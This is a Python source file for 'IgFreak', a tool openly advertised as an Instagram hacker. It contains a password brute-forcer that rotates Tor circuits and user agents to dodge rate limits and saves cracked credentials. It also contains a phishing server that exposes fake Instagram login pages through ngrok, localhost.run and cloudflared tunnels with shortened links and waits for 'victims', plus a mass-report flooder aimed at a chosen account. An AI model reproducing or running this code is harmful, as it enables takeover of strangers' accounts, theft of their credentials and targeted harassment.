#!/usr/bin/python3
# -*- coding: UTF-8 -*-
#
#
#  Copyright 2021 TDynamos <tdynamos@linux>
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  IT WAS SO HARD TO MAKE THIS BUT STILL I MADE
import os
import sys
import marshal
try:
	import requests,socks
except Exception:
	os.system('pip install requests[socks]')

def clr():
	os.system('clear')
try:
	from colorama import Fore,Back,Style
except Exception:
	os.system('pip install colorama')
	clr()
from colorama import Fore,Back,Style
try:
	import fake_useragent
except Exception:
	os.system('pip install fake_useragent')
	clr()
try:
	from stem.control import Controller
except Exception:
	os.system('pip install stem')
try:
	from pyngrok import ngrok 
except Exception:
	os.system('pip install pyngrok')	
	clr()
try:
	from pyngrok import ngrok 
except Exception:
	os.system("pip install pyngok")
	clr()
B = Style.BRIGHT+Fore.BLUE
G = Style.BRIGHT+Fore.GREEN
C = Style.BRIGHT+Fore.CYAN
Y = Style.BRIGHT+Fore.YELLOW
M = Style.BRIGHT+Fore.MAGENTA
W = Style.BRIGHT+Fore.WHITE
R = Style.BRIGHT+Fore.RED
version = "4.0 [Stable]"
def check_d():
    php = os.system("command -v  php > /dev/null")
    if php == 0:
        pass
    else:
        print(f"{R}[!] php - 404 NOT FOUND !")
        php_install = input(f"{B}\n[?] What to Install It Now ? (y/n) : {W}")
        if php_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt-get install php")
            return check_d()
    php2 = os.system("command -v  ssh > /dev/null")
    if php2 == 0:
        pass
    else:
        print(f"{R}[!] ssh - 404 NOT FOUND !")
        php_install = input(f"{B}\n[?] What to Install It Now ? (y/n) : {W}")
        if php_install.lower() == "y":
            os.system("apt-get update")
            os.system("apt install openssh ")
            os.system("apt-get install ssh ")
            return check_d()
    php3 = os.system("command -v  cloudflared > /dev/null")
    if php3 == 0:
        pass
    else:
        print(f"{R}[!] cloudflared - 404 NOT FOUND !")
        php_install = input(f"{B}\n[?] What to Install It Now ? (y/n) : {W}")
        if php_install.lower() == "y":
            install_cloudflared()
            return check_d()
code = """
torser="tor"
if pgrep -x "$torser" > /dev/null
then
echo ok
else
echo not
fi
"""
import subprocess
tors = subprocess.check_output(code,shell=True)
line = str(tors)
st = str(line.replace("b'",""))
s = st.replace("'","")
tors = s[:-2]
pyver = subprocess.check_output('python3 --version',shell=True)
line1 = str(pyver)
st1 = str(line1.replace("b'",""))
s1 = st1.replace("'","")
pyv = s1[:-2]
pyv = pyv.replace("Python ","")
if tors == "not":
	status = R+"Not Running"
else:
	status = "Running"
import pip
col = {"BL" : '\033[30m',"B" : '\033[94m',"C" : '\033[96m',"D" : '\033[36m',"G" : '\033[92m',"P" : '\033[95m',"R" : '\033[91m',"Y": '\033[93m',"W" : '\033[37m',"BLACK_BG" : '\033[40m',"RED_BG" : '\033[41m',"GREEN_BG" : '\033[42m',"YELLOW_BG" : '\033[43m',"BLUE_BG" : '\033[44m',"PURPLE_BG" : '\033[45m',"CYAN_BG" : '\033[46m',"WHITE_BG" : '\033[47m',"BOLD" : '\033[1m',"FAINT" : '\033[2m',"ITALIC" : '\033[3m',"UNDERLINE" : '\033[4m',"BLINK" : '\033[5m',"INVERSE" : '\033[7m',"HIDDEN": '\033[8m',"STRIKE" : '\033[9m',"END" : '\033[0m'}

def success(string):
    print(f"{col['R']}[{col['G']}  ✓  {col['R']}] {col['G']}{string}")

def initilise():
    os.system("touch .igfreak.conf > /dev/null 2>&1")

    conf =open(os.getcwd()+"/.igfreak.conf",'w')
    conf.writelines("""
igfreak_report_account = 'Igfreak_reporter' 
igfreak_report_account_pass = 'pass' """)
    conf.close()

def install_cloudflared():
    arch = os.uname()[4]
    if "arm" in arch or "Android" in arch:
        os.system(f"wget https://github.com/cloudflare/cloudflared/releases/download/2022.2.0/cloudflared-linux-arm --no-check-certificate && mv cloudflared-linux-arm {sys.prefix}/bin/cloudflared && chmod +x {sys.prefix}/bin/cloudflared ")
    elif "aarch64" in arch:
        os.system(f"wget https://github.com/cloudflare/cloudflared/releases/download/2022.2.0/cloudflared-linux-arm64 --no-check-certificate && mv cloudflared-linux-arm64 {sys.prefix}/bin/cloudflared && chmod +x {sys.prefix}/bin/cloudflared ")
    elif "x86_64" in arch:
        os.system(f"wget https://github.com/cloudflare/cloudflared/releases/download/2022.2.0/cloudflared-linux-amd64 --no-check-certificate && mv cloudflared-linux-amd64 {sys.prefix}/bin/cloudflared && chmod +x {sys.prefix}/bin/cloudflared ")
    else:
        os.system( f"wget https://github.com/cloudflare/cloudflared/releases/download/2022.2.0/cloudflared-linux-386 --no-check-certificate && mv cloudflared-linux-386 {sys.prefix}/bin/cloudflared && chmod +x {sys.prefix}/bin/cloudflared ")
    
try:
    a_file = open(".igfreak.conf")
    lines = a_file.readlines()
    for line in lines:
        exec(line)
    igfreak_report_account = igfreak_report_account
    igfreak_report_account_pass = igfreak_report_account_pass

except Exception as e:
    pass

def read_cred():
    if os.path.isfile(".igfreak.conf"):
        try:
            ohh = igfreak_report_account
        except Exception as e:
            error('Invaild syntax in conf file')
        if igfreak_report_account is None:
            error("Invaild account in conf file")
        else:
            account = igfreak_report_account
        if igfreak_report_account_pass is None:
            
            error("Invaild password in conf file")
        else:
            password = igfreak_report_account_pass

        return {"account":account,"password":password}
    else:
        error("You should initlize the tool by --initlize")
pipv = pip.__version__
logo = f"""
[38;5;203m [38;5;203m▄[38;5;203m█[38;5;203m [38;5;203m [38;5;203m [38;5;203m [38;5;203m [38;5;203m▄[38;5;203m█[38;5;203m█[38;5;204m█[38;5;198m█[38;5;198m█[38;5;198m█[38;5;198m▄
[38;5;203m█[38;5;203m█[38;5;203m█[38;5;203m [38;5;203m [38;5;203m [38;5;203m [38;5;203m█[38;5;204m█[38;5;198m█[38;5;198m [38;5;198m [38;5;198m [38;5;198m [38;5;198m█[38;5;198m█[38;5;198m█{R}  Instagram Hacked!
[38;5;203m█[38;5;203m█[38;5;203m█[38;5;203m▌[38;5;203m [38;5;204m [38;5;198m [38;5;198m█[38;5;198m█[38;5;198m█[38;5;198m [38;5;198m [38;5;198m [38;5;198m [38;5;198m█[38;5;199m▀{C}   | ╔══╗     ╔╗  |
[38;5;203m█[38;5;203m█[38;5;204m█[38;5;198m▌[38;5;198m [38;5;198m [38;5;198m▄[38;5;198m█[38;5;198m█[38;5;198m█{C}         | ║═╦╬╦═╦═╗║╠╗ |
[38;5;198m█[38;5;198m█[38;5;198m█[38;5;198m▌[38;5;198m [38;5;198m▀[38;5;198m▀[38;5;198m█[38;5;198m█[38;5;199m█[38;5;199m [38;5;199m█[38;5;199m█[38;5;199m█[38;5;199m█[38;5;199m▄{C}   | ║╔╣╔╣╩╣╬╚╣═╣ |
[38;5;198m█[38;5;198m█[38;5;198m█[38;5;198m [38;5;198m [38;5;198m [38;5;199m [38;5;199m█[38;5;199m█[38;5;199m█[38;5;199m [38;5;199m [38;5;199m [38;5;199m [38;5;199m█[38;5;163m█[38;5;164m█{C}  | ╚╝╚╝╚═╩══╩╩╝ |
[38;5;198m█[38;5;198m█[38;5;198m█[38;5;199m [38;5;199m [38;5;199m [38;5;199m [38;5;199m█[38;5;199m█[38;5;199m█[38;5;199m [38;5;199m [38;5;163m [38;5;164m [38;5;164m█[38;5;164m█[38;5;164m█
[38;5;199m█[38;5;199m▀[38;5;199m [38;5;199m [38;5;199m [38;5;199m [38;5;199m [38;5;199m█[38;5;199m█[38;5;163m█[38;5;164m█[38;5;164m█[38;5;164m█[38;5;164m█[38;5;164m█[38;5;164m▀{Y}   Coded By T-Dynamos

[0m
"""
help = f"""
{logo}

{Fore.MAGENTA}IgFreak , Slick Instagram brute force command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal
{W}
OPTIONS              USAGE                              REQUIRED

--bruteforce;-b       BruteForce Instagram Account         -pl(passlist),-u(username)
--phish;-ph           PHish any Instagram Account          -t(template)
--report;-r           Send 50 Reports to any IG Account    -u(usename),-id(reason report),-am(amount of reports )
--update              Update tool to latest version
--initlize            Initlize Reporter account         
{G}For more information visit {B}https://github.com/T-Dynamos/IgFreak
"""

def check_intr():
    try:
        requests.get("https://motherfuckingwebsite.com")
    except Exception:
        print(f"{R} Internet Connection Error ")
        sys.exit(2)       
from shutil import which

check = os.path.isfile('/usr/bin/bash')
if check == True:
	fileisd = '/etc/tor/torrc'
else:
	fileisd = "/data/data/com.termux/files/usr/etc/tor/torrc"
filepath = os.path.isfile(fileisd)

if filepath == True:
	filetor = open(fileisd,"w")
	filetor.writelines("ControlPort 9051\nHTTPTunnelPort 9876")
	filetor.close()
	pass
else:
	from pathlib import Path
	os.system(f"mkdir {fileisd[:-5]}")
	Path(fileisd).touch()
	filetor = open(fileisd,"a")
	filetor.writelines("ControlPort 9051\nHTTPTunnelPort 9876")
	filetor.close()
	pass
import urllib
def short(link):
	url =f'http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbmxDbzZTMTZ2WlJLZVBlTlNGbHVBNk1SZzI3UXxBQ3Jtc0trSkRmX1o4NmNYVTdIdFR3LVlQWE5LbmM2YlJPRTRGLTdvdkt6MlR3LWxSNzMwLTVQQ3pVU0JhdTRZNnRidHlvSmVtNHIyY1paYmE2MzJ3QV9UYllLdi1EcXlDVGYyY3hNVHZZOEVubnFVWUVZYUJMdw&q={(link)}'
	a = requests.get(url)
	return a.text
import colorama
from colorama import Fore , Style
P = colorama.Fore.LIGHTMAGENTA_EX
R = Style.BRIGHT+Fore.RED
from timeit import default_timer as timer
def check_tor():
	if tors == "not":

		print(f"{R}Error : {B}Tor is not running start it in new session")
		exit()
	else:
		pass
start = timer()
def printBox(str):
	a = len(str)
	return (f'{C}╔═{a*"═"}═╗\n║ {G+str} {C}║\n╚═{a*"═"}═╝')
try:
	from fake_useragent import UserAgent
	ua = UserAgent()
except Exception as e:
	pass
import sys
import pip
pipv = pip.__version__
version = 4.0
rs = requests.session()

def report(id,xx,amount,wait):
    printInfo("Reporter")
    a = read_cred()
    try:
        username = a["account"]
        password = a["password"] 
    except Exception as e :
        return error("Unexcepted error "+e)
    print(f"{G}\nUsing Account :{C} https://instagram.com/{username}")

    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
     'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '275',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': 'bc3d5af829ea',
    'x-requested-with': 'XMLHttpRequest'}
    data = {
         'username': f'{username}',
         'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
         'queryParams': '{}',
         'optIntoOneTap': 'false'}
    r = rs.post(url, headers=headers, data=data)
    if  'authenticated":true' in r.text or 'userId' in r.text:
        rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
        pass
    else:
        error("Login Failed")
        error(r.text)
        return sys.exit(0)
    if xx == 1:
        fid="1"
    if xx == 2:
        fid="5"

    if xx == 3:
        fid="8"
    if xx == 4:
        fid="8"
    if xx == 5:
        fid="7"
    if xx == 6:
        fid="2"
    if xx == 7:
        fid="6"
    else:
        fid="1"
    n=0
    nu=0
    u = rs.get(f"https://www.instagram.com/{id}/?__a=1")
    i1d =  str(u.json()["graphql"]["user"]["id"])
    print(G+"\nTarget : "+f"{id} : {C} {i1d}\n")
    for i_1 in range(1,amount):
        url_1=f'https://www.instagram.com/users/{i1d}/report/'
        data_1={'source_name':'','reason_id':f'1','frx_context':''}
        report_1=rs.post(url_1,data=data_1)
        if '"status":"ok"' in report_1.text:
            nu += 1
        else:
            n += 1
        sys.stdout.write(G+f"\r{W}[{R+str(i_1)}{W}]{G} Sent = {C}{nu}  {Y}Error = {R} {n}")
        sys.stdout.flush()
        import time
        time.sleep(wait)
    print(G+"\n\n Done . Sent Successfull !")    		
	
	
import argparse 

cli_parser = argparse.ArgumentParser(add_help=False)

cli_parser.add_argument('-username',  
                        '-u',
                        type=str,
                        help='username for Instagram account'
                        )
cli_parser.add_argument('-template',  
                        '-t',
                        type=str,
                        help='username for Instagram account'
                        )

cli_parser.add_argument('-password-list',
                        '-pl',
                        type=str,
                        help='password list file to try with the given username.'
)
cli_parser.add_argument('-amount', 
                        '-am',
                        type=str,
                        help='Amount of reports.'
)
cli_parser.add_argument('-id', 
                  
                        type=str,
                        help='Amount of reports.'
)
cli_parser.add_argument('--verbose',  
                        '--v',
                        action='count',
                        help='Activate Verbose mode. ( Verbose level )'
                        )
                        
cli_parser.add_argument('--bruteforce',  
                        '--b',
                        action='store_true',
                        help='password list file to try with the given username.'
                        )
cli_parser.add_argument('--phish', 
                        '--p',
                        action='store_true',
                        help='Phish any instagram account'
                        )
cli_parser.add_argument('--report',
                        '--r',
                        action='store_true',
                        help='Phish any instagram account')
cli_parser.add_argument('--help',  
                        '-h','-help',
						action='store_true',
                        
                        help=help
                        )
cli_parser.add_argument('--update', 
                    
						action='store_true',
                        
                        help=help
                        )
cli_parser.add_argument('--initlize', 
                        action='store_true',
                        
                        help=help
                        )
pwd = os.getcwd()

def phish(template):
    printInfo("Phisher ")
    os.system('pkill php')
    print()
    import random
    port = random.randint(1111,9999)
    print(f"""

    {C} Template : {G} {template}
    {C} Server   : {G} Ngrok , Localhost.run , CloudFlared
    {C} Port     : {G} {port}
    
    {B}       STARTING SERVERS
{G}{"="*25}{Y}  LOGS  {G}{"="*25}{R}""")
    a = startServicea(template+"/",port)
    link = a["link"]
    link2 = a["link2"]
    link3 = a["link3"]
    if link=="":
        print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
        print(f"{R}NGROK LINK DEPLOY FAILED")
        pass
    else:
        print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
        print(f"\n{G} NGROK LINK = {Y} {link}")
        print(f"{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
        print(f"{G} SHORT LINK = {Y} {short(link)}\n")
    if link2=="":
        print(f"\n{R}LOCALHOST.RUN LINK DEPLOY FAILED")
    else:
        print(f"\n{B} LOCALHOST.RUN LINK = {Y} {link2}")
        print(f"{B} LINK STATUS CODE = {W}[{G}{requests.get(link2).status_code}{W}] ")
        print(f"{B} SHORT LINK = {Y} {short(link2)}")
        print()
    if link3=="":
        print(f"\n{R}CLOUDFLARED LINK DEPLOY FAILED")
    else:
        print(f"\n{C} CLOUDFLARED LINK = {Y} {link3}")
        print(f"{C} LINK STATUS CODE = {W}[{G}{requests.get(link3).status_code}{W}] ")
        print(f"{C} SHORT LINK = {Y} {short(link3)}")
        print()
    print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
    def check(file):
        if os.path.exists(file):
            return True
        else:
            return False
    def ok():
        while True:
            a = check("ip.txt")
            if a==True:
                os.system('cat ip.txt')
                os.remove('ip.txt')
                continue
            else:
                continue        
    try:
        ok()

    except Exception as e:
        os.system("pkill php")
        print(f"\n{R} Exiting , Error : {G} {str(e)}")
        

    exit()


def startServicea(folder,port):
    import os
    os.chdir(folder)
    os.system("rm pass.txt ip.txt gmail.txt > /dev/null 2>&1")
    

    code = f"""php -S 127.0.0.1:{port}> /dev/null 2>&1 &"""
    fileok = os.system(code)
    import time
    time.sleep(3)
    try:
        link =  ngrok.connect(port,'http')
        ngrok.get_ngrok_process().stop_monitor_thread()
        link = str(link).replace('NgrokTunnel: "','')
        link = link[:-28]
    except Exception as e:
        link = ""
        pass
    command = f"""echo 'ssh -R 80:localhost:{port} nokey@localhost.run > ok.txt' > tmp.sh && sh -c 'sh tmp.sh > /dev/null 2>&1  &' && rm tmp.sh && sleep 10 && cat ok.txt | grep -o "https://[0-9A-Za-z.-]*\." && rm ok.txt"""
    try:
        oo = subprocess.check_output(command,shell=True)
        link2 = (str(oo.decode())[:-1])
    except Exception as e:
        link2 = ""
    os.system("rm ~/cld.log > /dev/null 2>&1")
    command2 = f"""cloudflared tunnel -url http://localhost:{port} --logfile ~/cld.log > /dev/null 2>&1 &  
    sleep 10 && grep -o "https://[-0-9a-z]*\.trycloudflare.com" ~/cld.log"""
    try:
        
        link3 = str(os.popen(command2).read()[:-1])
    except Exception as e:
            link3 = str(e)
            
    return {"link" : link ,"link2" : link2,"link3":link3}

def printInfo(str):
	print(f"{Fore.MAGENTA}IgFreak , Slick Instagram Hacking command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal\n .")
	os.system(f"dat=$(date) && echo {G}[{W}✓{G}] {C}Started {str} on {G}$dat")
def error(str):
	print()
	print(R+"E:"+Y+str)
def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
Parsed = cli_parser.parse_args()


def ExecuteIgFreak():
    Parsed = cli_parser.parse_args()
    if Parsed.initlize == True:
        initilise()
        success("Initlized Success ready to edit .igfreak.conf")
        sys.exit()
    if Parsed.update == True:
    	print("Updating...")
    	sys.exit(0)
    if Parsed.bruteforce == True:
    	if os.system("command -v tor > /dev/null") != 0:
    		print(f"{R}Tor not found or not installed")
    		sys.exit()
    	if Parsed.username is None:
    		error(" Please provide a username") 
    	elif Parsed.password_list is None:
    		error(" Please provide a passlist")
    	elif Parsed.username is not None and Parsed.password_list is not None:
    			printInfo("Bruteforcer")
    			check_intr()
    			if os.path.exists(Parsed.password_list):
    				import requests
    				response = requests.get("https://instagram.com/" + Parsed.username + "/")
    				if response.status_code == 404 :
    				         	error("Instagram account does not exists")
    				         	exit()
    				else:
    				         	pass
    				         	check_tor()
    				         	start = timer()
    				try:
    				         Bruteforce(Parsed.password_list,Parsed.username)
    				except Exception as e:
    				         	error(str(e))
    				         	print(f"\n{R} Exiting")
    				         	sys.exit(456)
    			else:
    				error(" Password list not found ")
    				sys.exit(1)
    elif Parsed.help == True:
    	print(help)
    	exit()
   

    elif Parsed.phish == True:
    	check_d()
    	if Parsed.template  is not None:
    		if Parsed.template == "instafollowers" or Parsed.template == "instagram" or Parsed.template == "igbadges":
    			phish(Parsed.template)
    		else:
    			error(f"Template {R+Parsed.template+Y} not found")
    			print()
    			print(f"{W} Available Templates")
    			print(f"""
{G}Template      Description{W}
    			
{B}igbadges       : {W}Hack account by confirming account in get verified badges
{B}instagram      : {W}Instagram simple login page 
{B}instafollowers : {W}Get Instagram accounts by seeking followers""")
    			exit(1)
    		print()
    		try:
    			phish(Parsed.template)
    		except exception:
    			print(f"\n\n{Y} Exiting ")
    			pass   			
    		exit(0)
    	elif Parsed.template is None:
    		print()
    		error("Please Provide a template")
    		exit()
    elif Parsed.report == True: 
    	if Parsed.username is not None:
    		if Parsed.amount is not None:
    			if Parsed.id is not None:
    				report(Parsed.username,int(Parsed.id),int(Parsed.amount),0.5)
    	else:
    		error("Please provide a username")
    		exit()
    	
    else:
    	print(help)
    	pass


import requests
from stem.control import Controller
from stem import Signal


def renew_connection():
    with Controller.from_port(port=9051) as c:
        c.authenticate()
        c.signal(Signal.NEWNYM)
url = 'https://www.instagram.com/accounts/login/ajax/'
import random
	
def signin(password,username):
    user=ua.random
    headers = {
     'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '275',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    f'user-agent': user,
    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': 'bc3d5af829ea',
    'x-requested-with': 'XMLHttpRequest'
    }
    data = {'username': f'{username}',
         'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
         'queryParams': '{}',
         'optIntoOneTap': 'false'}

    print(f"{B}[{G}>{B}]{W} Using Agent : {G}{user}")
    ipc = requests.get("https://httpbin.org/ip").json()['origin']
    print(f"{B}[{G}>{B}]{W} Current ip : {G}{ipc}")
    renew_connection()
    por = {"http": "http://localhost:9876", "https": "http://localhost:9876"}
    ipc = requests.get("https://httpbin.org/ip",proxies=por).json()['origin']
    por2 = {"http": f"http://{ipc}:80", "https": f"https://{ipc}:80"}
    print(f"{B}[{G}>{B}]{W} Changed ip : {G}{ipc}")
    print(f"{B}[{G}>{B}]{W} Using Proxy : {G}{por2}")
    try:
        r = requests.post(url, headers=headers, data=data,proxies=por,timeout=10)
    except Exception as e:
        print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
        signin(password,username)
    print(f"{B}[{G}>{B}] {W}Response   : {W}{r.json()['status']}")
    try:
        print(f"{B}[{G}>{B}] {R}Message    : {W}{r.json()['message']}")
    except KeyError:
        pass
    if r.json()['status'] == "fail":
        print(f"{G}[{W}>{G}]{R} Retrying using another proxy")
        signin(password,username)
        pass
    else:
        pass
    if  'authenticated":true' in r.text or 'userId' in r.text:
        rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
        print(f"{B}[{G}>{B}] {W}Authenticated : {W} True")
        print(f"{G}[{Y}!{G}] {Y}Password found : {B}",password)
        strtxt = username+".igfreak"
        filepass = open(strtxt,"w")
        filepass.writelines(f"Username : {username}\nPassword : {password}")
        filepass.close()
        print()
        head(f"Saved as : {strtxt}")
        return True
    else:
        return False
        
def read(passlist):
	import csv
	crimefile = open(passlist, 'r')
	reader = csv.reader(crimefile)
	allRows = [row for row in reader]
	return allRows
        	

def head(str):
	print(R+"["+G+">"+R+"] "+C+str)
def Bruteforce(passlist,username):
    n_words = len(list(open(passlist, "rb")))
    head(f"Total passwords to test: {B}"+ str(n_words))
    print(f"\n{R}║{W} Instagram Id = {G}{username}{W}{R} ║")
    for count,password in enumerate(read(passlist)):
        print(f"\n\n{Y}[{W}{count+1}/{n_words}{Y}]{C} Testing password : {G}"+"".join(password)) 
        trial = signin("".join(password),username)
        if trial == True:
            end = timer()
            print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	                   	
            sys.exit()
        else:
            continue
    end = timer()
    print(f"\n{Y} Elapsed Time : {G}{end -start} seconds")	
    sys.exit()

def check_igid(username):
    try:
        u = rs.get(f"https://www.instagram.com/{username}/?__a=1")
        id =  str(u.json()["graphql"]["user"]["id"])
        pass
  
    except Exception as e:
    	error("Check the victim's account")
    	exit()

if __name__=="__main__":
	ExecuteIgFreak()   
else:
	pass